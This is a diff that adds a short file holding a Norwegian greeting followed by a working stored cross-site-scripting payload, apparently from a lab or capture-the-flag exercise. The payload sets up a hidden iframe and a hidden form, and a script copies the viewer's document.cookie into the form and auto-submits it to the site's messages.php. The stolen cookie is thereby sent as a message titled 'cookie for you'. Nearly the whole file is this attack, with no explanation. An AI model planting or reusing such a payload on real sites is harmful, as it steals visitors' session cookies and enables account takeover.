@@ -1,0 +1,18 @@
+Hvordan går det?
+
+<iframe name="hiddenFrame" class="hide" style="display:none;"></iframe>
+
+
+<form id="derp" name="sendcookie" method="POST"
+  action="/messages.php" target="hiddenFrame">
+ <input type="hidden" name="user" value="you" >
+ <input type="hidden" name="headline" value="cookie for you">
+ <input type="hidden" name="message" value="" id="herp">
+ <input type="hidden" name="message_submit" value="Send">
+</form>
+
+<script>
+document.getElementById("herp").value = document.cookie;
+
+document.getElementById("derp").submit();
+</script>
